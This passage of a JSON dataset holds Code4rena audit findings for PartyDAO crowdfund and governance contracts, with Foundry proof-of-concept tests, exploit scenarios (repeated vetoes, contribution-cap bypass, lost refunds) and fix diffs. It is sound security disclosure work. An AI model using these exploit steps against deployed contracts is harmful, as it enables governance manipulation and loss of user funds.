This is done so parties may use the minimum\n                // and maximum contribution values to limit the voting power of each\n                // card (e.g. a party desiring a \"1 card = 1 vote\"-like governance\n                // system where each card has equal voting power).\n                uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;\n                if (contribution < minContribution_) {\n                    revert BelowMinimumContributionsError(contribution, minContribution_);\n                }\n\n                if (contribution > maxContribution_) {\n                    revert AboveMaximumContributionsError(contribution, maxContribution_);\n                }\n\n<https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L357-L369>\n\nHowever, this check can be bypassed due to the following code segment\n\n            else if (party.ownerOf(tokenId) == contributor) {\n                // Increase voting power of contributor's existing party card.\n                party.addVotingPower(tokenId, votingPower);\n            } \n\n<https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L295-L298>\n\nConsider the following situation. Suppose ReraiseETHCrowdfund sets maximumContribution to only allow at most 3 units of voting power in each card. Some user X can contribute the maximum amount twice as 2 different contributor addresses A & B (both of which he controls). When the crowdfund has finalized, X can first call claim as A, then transfer the partyGovernanceNFT from A to B (note that while the crowdfundNFT can't be transferred, the partyGovernanceNFT can be transferred), and finally call claim as B to get a card with 6 units of voting power.\n\n### Impact\n\nThe degree of impact really depends on the use case of the party. Some parties would like each card to represent a single vote - this would obviously violate that. Generally, it's not a great idea to allow a single card to hold a high amount of votes, so I'll leave this as a medium for now.\n\n### Recommended Mitigation Steps\n\nOne solution is to restrict the maximum voting power on partyGovernanceNFT's side. It can check the votingPower of each card before [adding more votingPower](https://github.com/code-423n4/2023-04-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L169) to it.\n\n**[0xble (Party) commented](https://github.com/code-423n4/2023-04-party-findings/issues/39#issuecomment-1512169729):**\n > @evan - Couldn't this also be mitigated by checking the voting power held by a card before adding voting power to it?\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/39#issuecomment-1515508786):**\n > Considering a refactor to only check `contribution > maxContribution` in `claim()` if `disableContributingForExistingCard` is true, which would mitigate this.\n> \n> The reasoning is the check was added for the case to support parties that wish to have a \"1 card, 1 vote\"-type governance system and must have fixed voting power per card. To do this we would expect `disableContributingForExistingCard` to be enabled. If it is not, the creator would be indicating it doesn't matter.\n\n**[0xble (Party) commented](https://github.com/code-423n4/2023-04-party-findings/issues/39#issuecomment-1532059790):**\n > We've decided to refactor the way claiming works in the `ReraiseETHCrowdfund`, partially because a large number of findings like this being submitted around that one area that highlighted for us the need to rework its logic.\n> \n> The change will make it so (1) crowdfund NFTs are minted per contribution instead of per address and (2) claiming works more like a 1:1 conversion of your crowdfund NFT into a party card instead of how it works now. In the future we will also add the ability to split/merge party cards.\n> \n> This should mitigate this finding because the voting power transferred from crowdfund NFT to party card is known to be within the min/max contribution limit (otherwise the contribution that created the crowdfund NFT would have reverted) so there is no longer a min/max contribution check required when claiming.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the ReraiseETHCrowdfund contract which tries to limit the voting power of each card by doing a min/maxContribution check in claim and claimMultiple functions. However, this check can be bypassed by a user who controls multiple contributor addresses. In such a situation, the user can contribute the maximum amount twice as two different contributor addresses, and then call claim as both to get a card with more voting power than the maximum allowed.\n\nThe degree of impact of this bug depends on the use case of the party, and generally it is not a good idea to allow a single card to hold a high amount of votes. One solution suggested is to restrict the maximum voting power on partyGovernanceNFT's side. It can check the votingPower of each card before adding more votingPower to it.\n\nThe bug has been mitigated by refactoring the way claiming works in the ReraiseETHCrowdfund. This has made it so crowdfund NFTs are minted per contribution instead of per address, and claiming works more like a 1:1 conversion of the crowdfund NFT into a party card. This should mitigate the bug because the voting power transferred from crowdfund NFT to party card is known to be within the min/max contribution limit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/39",
      "tags": [],
      "finders": [
        "evan",
        "hansfriese"
      ]
    },
    {
      "id": "19988",
      "title": "[M-01] Use of `_mint` in `ReraiseETHCrowdfund#_contribute` is incompatible with `PartyGovernanceNFT#mint`",
      "impact": "MEDIUM",
      "content": "\nMisconfigured receiver could accidentally DOS party.\n\n### Proof of Concept\n\n[ReraiseETHCrowdfund.sol#L238](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L238)\n\n        if (previousVotingPower == 0) _mint(contributor); <- @audit-issue standard minting here\n\n[ReraiseETHCrowdfund.sol#L374](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L374)\n\n            uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate); <- @audit-issue uses party.mint\n\n[PartyGovernanceNFT.sol#L162](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L162)\n\n        _safeMint(owner, tokenId); <- @audit-issue PartyGovernanceNFT#mint utilizes _safeMint\n\nThe issue at hand is that ReraiseETHCrowdfund#\\_contribute and PartyGovernanceNFT#mint use inconsistent minting methods. PartyGovernanceNFT uses safeMint whereas ReraiseETHCrowdfund uses the standard mint. This is problematic because this means that a contract that doesn't implement ERC721Receiver can receive a CrowdfundNFT but they can never claim because safeMint will always revert. This can cause a party to be inadvertently DOS'd because CrowdfundNFTs are soul bound and can't be transferred.\n\n### Recommended Mitigation Steps\n\nUse \\_safeMint instead of \\_mint for ReraiseETHCrowdfund#\\_contribute\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/42#issuecomment-1512115454):**\n > I think a better mitigation would be to allow the user to specify a `receiver` address that can receive the party NFT when claiming, so if they cannot claim themselves they can specify another address that should receive it instead. It works similarly in `Crowdfund`, used to implement prior crowdfunds.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code of the 2023-04-party project, which contains contracts for a party platform. The bug is caused by the inconsistent use of minting methods in two different contracts - ReraiseETHCrowdfund#_contribute and PartyGovernanceNFT#mint. The former uses the standard minting method while the latter uses the safeMinting method. This is a problem because it means that a contract which does not implement ERC721Receiver can receive a CrowdfundNFT from the ReraiseETHCrowdfund#_contribute contract, but can never claim it because safeMinting will always revert. This can cause the party to be inadvertently DOS'd because CrowdfundNFTs are soul bound and can't be transferred.\n\nThe recommended mitigation steps to address this issue are to use _safeMint instead of _mint for ReraiseETHCrowdfund#_contribute. An alternative mitigation was also suggested by 0xble (Party), which is to allow the user to specify a 'receiver' address that can receive the party NFT when claiming, so if they cannot claim themselves they can specify another address that should receive it instead.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/42",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "19987",
      "title": "[H-08] `VetoProposal`: User can veto multiple times so every proposal can be vetoed by any user that has a small amount of votes",
      "impact": "HIGH",
      "content": "\nThe [`VetoProposal`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L8-L69) contract allows to veto proposals with the [`voteToVeto`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L19-L60) function.\n\nWhen the amount of votes collected to veto a proposal exceeds a certain threshold (the `passThresholdBps`, which is determined upon initialization of the party), the proposal is vetoed, meaning it cannot execute anymore (its status becomes `Defeated`).\n\nThe `passThresholdBps` specifies a percentage of the `totalVotingPower` of the party.\n\nE.g. `passThresholdBps=1000` means that 10% of the `totalVotingPower` must veto a proposal such that the veto goes through.\n\nThe issue is that the contract lacks the obvious check that a user has not vetoed before, thereby a user can veto multiple times.\n\nSo say a user holds 1% of `totalVotingPower` and in order for the veto to go through, 10% of `totalVotingPower` must veto.\n\nThe user can just veto 10 times to reach the 10% requirement.\n\nThe impact is obvious: Any user with a small amount of votes can veto any proposal. This is a critical bug since the party may become unable to perform any actions if there is a user that vetoes all proposals.\n\n### Proof of Concept\n\nAdd the following test to the `VetoProposal.t.sol` test file:\n\n```solidity\nfunction test_VetoMoreThanOnce() public {\n    _assertProposalStatus(PartyGovernance.ProposalStatus.Voting);\n\n    // Vote to veto\n    vm.prank(voter1);\n    vetoProposal.voteToVeto(party, proposalId, 0);\n\n    _assertProposalStatus(PartyGovernance.ProposalStatus.Voting);\n    assertEq(vetoProposal.vetoVotes(party, proposalId), 1e18);\n\n    // Vote to veto (passes threshold)\n    vm.prank(voter1);\n    vetoProposal.voteToVeto(party, proposalId, 0);\n\n    _assertProposalStatus(PartyGovernance.ProposalStatus.Defeated);\n    assertEq(vetoProposal.vetoVotes(party, proposalId), 0); // Cleared after proposal is vetoed\n}\n```\n\nIn the test file, these are the conditions: `totalVotingPower = 3e18`, required votes threshold is 51%, `voter1` has `1e18` votes which is `~33%`. Clearly `voter1` should not be able to veto the proposal on his own.\n\nYou can see in the test that `voter1` can veto 2 times.\n\nAfter the first call to `voteToVeto`, the threshold is not yet reached (the proposal is still in the `Voting` state).\n\nAfter the second call to `voteToVeto` the threshold is reached and the proposal is in the `Defeated` state.\n\n### Tools Used\n\nVSCode, Foundry\n\n### Recommended Mitigation Steps\n\nThe fix is straightforward.\n\nWe introduce a `hasVoted` mapping that tracks for each `(party, proposalId, address)` triplet if it has vetoed already.\n\nFix:\n\n```diff\ndiff --git a/contracts/proposals/VetoProposal.sol b/contracts/proposals/VetoProposal.sol\nindex 780826f..fb1f1ab 100644\n--- a/contracts/proposals/VetoProposal.sol\n+++ b/contracts/proposals/VetoProposal.sol\n@@ -8,9 +8,11 @@ import \"../party/Party.sol\";\n contract VetoProposal {\n     error NotPartyHostError();\n     error ProposalNotActiveError(uint256 proposalId);\n+    error AlreadyVotedError(address caller);\n \n     /// @notice Mapping from party to proposal ID to votes to veto the proposal.\n     mapping(Party => mapping(uint256 => uint96)) public vetoVotes;\n+    mapping(Party => mapping(uint256 => mapping(address => bool))) public hasVoted;\n \n     /// @notice Vote to veto a proposal.\n     /// @param party The party to vote on.\n@@ -33,6 +35,12 @@ contract VetoProposal {\n         if (proposalStatus != PartyGovernance.ProposalStatus.Voting)\n             revert ProposalNotActiveError(proposalId);\n \n+        if (hasVoted[party][proposalId][msg.sender]) {\n+            revert AlreadyVotedError(msg.sender);\n+        }\n+\n+        hasVoted[party][proposalId][msg.sender] = true;\n+\n         // Increase the veto vote count\n         uint96 votingPower = party.getVotingPowerAt(\n             msg.sender,\n```\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/2#issuecomment-1512069305)**\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report describes an issue with the `VetoProposal` contract, which allows users to veto a proposal with the `voteToVeto` function. When the amount of votes collected to veto a proposal exceeds a certain threshold, the proposal is vetoed and cannot execute anymore. This threshold is calculated as a percentage of the total voting power of the party. The issue is that users can veto multiple times, meaning that a user with a small amount of votes can veto any proposal. This could lead to the party being unable to perform any actions if a user vetoes all proposals. \n\nTo prove this issue, a test was added to the `VetoProposal.t.sol` test file. This test showed that a user with 33% of the total voting power was able to veto a proposal twice, reaching the required threshold and vetoing the proposal.\n\nThe recommended mitigation step is to introduce a `hasVoted` mapping that tracks for each `(party, proposalId, address)` triplet if it has vetoed already. This fix was confirmed by 0xble (Party).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/2",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "19986",
      "title": "[H-07] `InitialETHCrowdfund` + `ReraiseETHCrowdfund`: `batchContributeFor` function may not refund ETH which leads to loss of funds",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268>\n\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L174-L202>\n\nThis vulnerability exists in both the [`InitialETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol) and [`ReraiseETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol) contracts in exactly the same way.\n\nI will continue this report by explaining the issue in only one contract. The mitigation section however contains the fix for both instances.\n\nThe [`batchContributeFor`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268) function is a wrapper that allows to make multiple calls to `contributeFor` within one function call.\n\nIt is possible to specify that this function should not revert when one individual call to `contributeFor` fails by setting `args.revertOnFailure=false`.\n\nThe issue is that in this case the ETH for a failed contribution is not refunded which leads a loss of funds for the user calling the function.\n\nNote:<br>\nThis issue also exists in the [`Crowdfund.batchContributeFor`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/Crowdfund.sol#L367-L385) function which is out of scope. The sponsor knows about this and will fix it.\n\n### Proof of Concept\n\nLet's look at the `batchContributeFor` function:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268)\n\n```solidity\nfunction batchContributeFor(\n    BatchContributeForArgs calldata args\n) external payable onlyDelegateCall returns (uint96[] memory votingPowers) {\n    uint256 numContributions = args.recipients.length;\n    votingPowers = new uint96[](numContributions);\n\n\n    uint256 ethAvailable = msg.value;\n    for (uint256 i; i < numContributions; ++i) {\n        ethAvailable -= args.values[i];\n\n\n        (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(\n            abi.encodeCall(\n                this.contributeFor,\n                (\n                    args.tokenIds[i],\n                    args.recipients[i],\n                    args.initialDelegates[i],\n                    args.gateDatas[i]\n                )\n            )\n        );\n\n\n        if (!s) {\n            if (args.revertOnFailure) {\n                r.rawRevert();\n            }\n        } else {\n            votingPowers[i] = abi.decode(r, (uint96));\n        }\n    }\n\n\n    // Refund any unused ETH.\n    if (ethAvailable > 0) payable(msg.sender).transfer(ethAvailable);\n}\n```\n\nWe can see that `ethAvailable` is reduced before every call to `contributeFor`:\n\n```solidity\nethAvailable -= args.values[i];\n```\n\nBut it is only checked later if the call was successful:\n\n```solidity\nif (!s) {\n    if (args.revertOnFailure) {\n        r.rawRevert();\n    }\n```\n\nAnd if `args.revertOnFailure=false` there is no revert and `ethAvailable` is not increased again.\n\nTherefore the user has to pay for failed contributions.\n\nAdd the following test to the `InitialETHCrowdfund.t.sol` test file:\n\n```solidity\nfunction test_batchContributeFor_noETHRefund() public {\n    InitialETHCrowdfund crowdfund = _createCrowdfund({\n        initialContribution: 0,\n        initialContributor: payable(address(0)),\n        initialDelegate: address(0),\n        minContributions: 1 ether,\n        maxContributions: type(uint96).max,\n        disableContributingForExistingCard: false,\n        minTotalContributions: 3 ether,\n        maxTotalContributions: 5 ether,\n        duration: 7 days,\n        fundingSplitBps: 0,\n        fundingSplitRecipient: payable(address(0))\n    });\n    Party party = crowdfund.party();\n\n    address sender = _randomAddress();\n    vm.deal(sender, 2.5 ether);\n\n    // Batch contribute for\n    vm.prank(sender);\n    uint256[] memory tokenIds = new uint256[](3);\n    address payable[] memory recipients = new address payable[](3);\n    address[] memory delegates = new address[](3);\n    uint96[] memory values = new uint96[](3);\n    bytes[] memory gateDatas = new bytes[](3);\n    for (uint256 i; i < 3; ++i) {\n        recipients[i] = _randomAddress();\n        delegates[i] = _randomAddress();\n        values[i] = 1 ether;\n    }\n\n    // @audit-info set values[2] = 0.5 ether such that contribution fails (minContribution = 1 ether)\n    values[2] = 0.5 ether;\n\n    uint96[] memory votingPowers = crowdfund.batchContributeFor{ value: 2.5 ether }(\n        InitialETHCrowdfund.BatchContributeForArgs({\n            tokenIds: tokenIds,\n            recipients: recipients,\n            initialDelegates: delegates,\n            values: values,\n            gateDatas: gateDatas,\n            revertOnFailure: false\n        })\n    );\n\n    // @audit-info balance of sender is 0 ETH even though 0.5 ETH of the 2.5 ETH should have been refunded\n    assertEq(address(sender).balance, 0 ether);\n}\n```\n\nThe `sender` sends 2.5 ETH and 1 of the 3 contributions fails since `minContribution` is above the amount the `sender` wants to contribute (Note that in practice there are more ways for the contribution to fail).\n\nThe sender's balance in the end is 0 ETH which shows that there is no refund.\n\n### Tools Used\n\nVSCode,Foundry\n\n### Recommended Mitigation Steps\n\nThe following changes need to be made to the `InitialETHCrowdfund` and `ReraiseETHCrowdfund` contracts:\n\n```diff\ndiff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol\nindex 8ab3b5c..19e09ac 100644\n--- a/contracts/crowdfund/InitialETHCrowdfund.sol\n+++ b/contracts/crowdfund/InitialETHCrowdfund.sol\n@@ -240,8 +240,6 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {\n \n         uint256 ethAvailable = msg.value;\n         for (uint256 i; i < numContributions; ++i) {\n-            ethAvailable -= args.values[i];\n-\n             (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(\n                 abi.encodeCall(\n                     this.contributeFor,\n@@ -260,6 +258,7 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {\n                 }\n             } else {\n                 votingPowers[i] = abi.decode(r, (uint96));\n+                ethAvailable -= args.values[i];\n             }\n         }\n```\n\n```diff\ndiff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol\nindex 580623d..ad70b27 100644\n--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol\n+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol\n@@ -179,8 +179,6 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n \n         uint256 ethAvailable = msg.value;\n         for (uint256 i; i < numContributions; ++i) {\n-            ethAvailable -= args.values[i];\n-\n             (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(\n                 abi.encodeCall(\n                     this.contributeFor,\n@@ -194,6 +192,7 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n                 }\n             } else {\n                 votingPowers[i] = abi.decode(r, (uint96));\n+                ethAvailable -= args.values[i];\n             }\n         }\n```\n\nNow `ethAvailable` is only reduced when the call to `contributeFor` was successful.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-04-party-findings/issues/7#issuecomment-1509833957):**\n > Would welcome comment on this issue.  AFAICT, this leads to a direct loss of user funds, which makes me think that a High severity is warranted.  There is no external pre-condition(s) required for this to happen.\n\n**[HollaDieWaldfee (warden) commented](https://github.com/code-423n4/2023-04-party-findings/issues/7#issuecomment-1509839293):**\n > @0xean - Yeah you are right, it leads to a direct loss of funds and there are no preconditions. Should have set it to \"High\" probably. \n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/7#issuecomment-1512082170)**\n\n**[0xean (judge) increased severity to High](https://github.com/code-423n4/2023-04-party-findings/issues/7#issuecomment-1521739156)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability existing in both the InitialETHCrowdfund and ReraiseETHCrowdfund contracts. The vulnerability is related to the batchContributeFor function which allows users to make multiple calls to contributeFor within one function call. The issue is that if the argument revertOnFailure is set to false, the ETH for a failed contribution is not refunded which leads to a loss of funds for the user calling the function.\n\nA proof of concept has been created to show how the bug works. The sender sends 2.5 ETH and 1 of the 3 contributions fails since minContribution is above the amount the sender wants to contribute. The sender's balance in the end is 0 ETH which shows that there is no refund.\n\nTo fix the issue, the InitialETHCrowdfund and ReraiseETHCrowdfund contracts need to be changed so that ethAvailable is only reduced when the call to contributeFor is successful. The severity of the issue was increased to High.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/7",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "evan",
        "hansfriese"
      ]
    },
    {
      "id": "19985",
      "title": "[H-06] `ETHCrowdfundBase.sol`: `totalVotingPower` is increased too much in the `_finalize` function",
      "impact": "HIGH",
      "content": "\nThis issue is about how the [`ETHCrowdfundBase._finalize`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273-L292) functions calls [`PartyGovernanceNFT.increaseTotalVotingPower`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L193-L197) with an amount that does not reflect the sum of the individual users' voting power.\n\nThereby it will become impossible to reach unanimous votes. In other words and more generally the users' votes are worth less than they should be as the percentage is calculated against a total amount that is too big.\n\nIn short, this is how the issue is caused:\n\n1.  The voting power that a user receives is based on the amount they contribute MINUS funding fees\n2.  The amount of voting power by which `totalVotingPower` is increased is based on the total contributions WITHOUT subtracting funding fees\n\n### Proof of Concept\n\nLet's first look at the affected code and then at the PoC.\n\nThe `votingPower` that a user receives for making a contribution is calculated in the `ETHCrowdfundBase._processContribution` function.\n\nWe can see that first the funding fee is subtracted and then with the lowered `amount`, the `votingPower` is calculated:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L224-L233)\n\n```solidity\n// Subtract fee from contribution amount if applicable.\naddress payable fundingSplitRecipient_ = fundingSplitRecipient;\nuint16 fundingSplitBps_ = fundingSplitBps;\nif (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n    uint96 feeAmount = (amount * fundingSplitBps_) / 1e4;\n    amount -= feeAmount;\n}\n\n\n// Calculate voting power.\nvotingPower = (amount * exchangeRateBps) / 1e4;\n```\n\nEven before that, `totalContributions` has been increased by the full `amount` (funding fees have not been subtracted yet):\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L204-L222)\n\n```solidity\nuint96 newTotalContributions = totalContributions + amount;\nuint96 maxTotalContributions_ = maxTotalContributions;\nif (newTotalContributions >= maxTotalContributions_) {\n    totalContributions = maxTotalContributions_;\n\n\n    // Finalize the crowdfund.\n    // This occurs before refunding excess contribution to act as a\n    // reentrancy guard.\n    _finalize(maxTotalContributions_);\n\n\n    // Refund excess contribution.\n    uint96 refundAmount = newTotalContributions - maxTotalContributions;\n    if (refundAmount > 0) {\n        amount -= refundAmount;\n        payable(msg.sender).transferEth(refundAmount);\n    }\n} else {\n    totalContributions = newTotalContributions;\n}\n```\n\n(Note that the above code looks more complicated than it is because it accounts for the fact that `maxTotalContributions` might be reached. But this is not important for explaining this issue)\n\nWhen `PartyGovernanceNFT.increaseTotalVotingPower` is called it is with the `newVotingPower` that has been calculated BEFORE funding fees are subtracted:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L278-L288)\n\n```solidity\nuint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;\nparty.increaseTotalVotingPower(newVotingPower);\n\n\n// Transfer fee to recipient if applicable.\naddress payable fundingSplitRecipient_ = fundingSplitRecipient;\nuint16 fundingSplitBps_ = fundingSplitBps;\nif (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n    uint96 feeAmount = (totalContributions_ * fundingSplitBps_) / 1e4;\n    totalContributions_ -= feeAmount;\n    fundingSplitRecipient_.transferEth(feeAmount);\n}\n```\n\nTherefore `totalVotingPower` is increased more than the sum of the voting power that the users have received.\n\nLet's look at the PoC:\n\n```javascript\nfunction test_totalVotingPower_increased_too_much() public {\n        ReraiseETHCrowdfund crowdfund = _createCrowdfund({\n            initialContribution: 0,\n            initialContributor: payable(address(0)),\n            initialDelegate: address(0),\n            minContributions: 0,\n            maxContributions: type(uint96).max,\n            disableContributingForExistingCard: false,\n            minTotalContributions: 2 ether,\n            maxTotalContributions: 5 ether,\n            duration: 7 days,\n            fundingSplitBps: 1000,\n            fundingSplitRecipient: payable(address(1))\n        });\n\n        address member1 = _randomAddress();\n        address member2 = _randomAddress();\n        vm.deal(member1, 1 ether);\n        vm.deal(member2, 1 ether);\n\n        // Contribute, should be allowed to update delegate\n        vm.startPrank(member1);\n        crowdfund.contribute{ value: 1 ether }(member1, \"\");\n        vm.stopPrank();\n\n        vm.startPrank(member2);\n        crowdfund.contribute{ value: 1 ether }(member2, \"\");\n        vm.stopPrank();\n\n        skip(7 days);\n        console.log(party.getGovernanceValues().totalVotingPower);\n        crowdfund.finalize();\n        console.log(party.getGovernanceValues().totalVotingPower);\n\n        console.log(crowdfund.pendingVotingPower(member1));\n        console.log(crowdfund.pendingVotingPower(member2));\n    }\n```\n\nSee that `totalVotingPower` is increased from `0` to `2e18`.\n\nThe voting power of both users is `0.9e18` (10% fee).\n\nThereby both users together receive a voting power of `1.8e18` which is only 90% of `2e18`.\n\nTherefore it is impossible to reach an unanimous vote.\n\n### Tools Used\n\nVSCode, Foundry\n\n### Recommended Mitigation Steps\n\nThe fix is easy:<br>\nWe must consider the funding fee when increasing the `totalVotingPower`.\n\nFix:\n\n```diff\ndiff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol\nindex 4392655..3c11160 100644\n--- a/contracts/crowdfund/ETHCrowdfundBase.sol\n+++ b/contracts/crowdfund/ETHCrowdfundBase.sol\n@@ -274,10 +274,6 @@ contract ETHCrowdfundBase is Implementation {\n         // Finalize the crowdfund.\n         delete expiry;\n \n-        // Update the party's total voting power.\n-        uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;\n-        party.increaseTotalVotingPower(newVotingPower);\n-\n         // Transfer fee to recipient if applicable.\n         address payable fundingSplitRecipient_ = fundingSplitRecipient;\n         uint16 fundingSplitBps_ = fundingSplitBps;\n@@ -287,6 +283,10 @@ contract ETHCrowdfundBase is Implementation {\n             fundingSplitRecipient_.transferEth(feeAmount);\n         }\n \n+        // Update the party's total voting power.\n+        uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;\n+        party.increaseTotalVotingPower(newVotingPower);\n+        \n         // Transfer ETH to the party.\n         payable(address(party)).transferEth(totalContributions_);\n     }\n```\n\n**[0xean (judge) increased severity to High and commented](https://github.com/code-423n4/2023-04-party-findings/issues/11#issuecomment-1509823808):**\n > I am upgrading severity here to match [`#27`](https://github.com/code-423n4/2023-04-party-findings/issues/27) and will look forward to sponsor comments.\n> \n> I think this exposes a way in which there are parameter sets that leads to a loss of funds by not allowing any proposal to be executed. \n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/11#issuecomment-1512119443)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the [`ETHCrowdfundBase._finalize`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273-L292) function in the 2023-04-party Github repository. The issue is that when this function calls [`PartyGovernanceNFT.increaseTotalVotingPower`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L193-L197), it does so with an amount that does not reflect the sum of the individual users' voting power. This makes it impossible to reach unanimous votes, as the users' votes are worth less than they should be.\n\nThe problem is caused by the fact that the voting power that a user receives is based on the amount they contribute minus funding fees, while the amount of voting power by which `totalVotingPower` is increased is based on the total contributions without subtracting funding fees.\n\nA proof of concept was provided to demonstrate the issue, which shows that when `totalVotingPower` is increased from 0 to 2e18, the voting power of both users is 0.9e18 (10% fee), and together they only receive a voting power of 1.8e18 which is only 90% of 2e18.\n\nThe recommended mitigation step is to consider the funding fee when increasing the `totalVotingPower`. This can be done by making the following code changes:\n\n```diff\ndiff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol\nindex 4392655..3c11160 100644\n--- a/contracts/crowdfund/ETHCrowdfundBase.sol\n+++ b/contracts/crowdfund/ETHCrowdfundBase.sol\n@@ -274,10 +274,6 @@ contract ETHCrowdfundBase is",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/11",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "hansfriese"
      ]
    },
    {
      "id": "19984",
      "title": "[H-05] `ReraiseETHCrowdfund.sol`: party card transfer can be front-run by claiming pending voting power which results in a loss of the voting power",
      "impact": "HIGH",
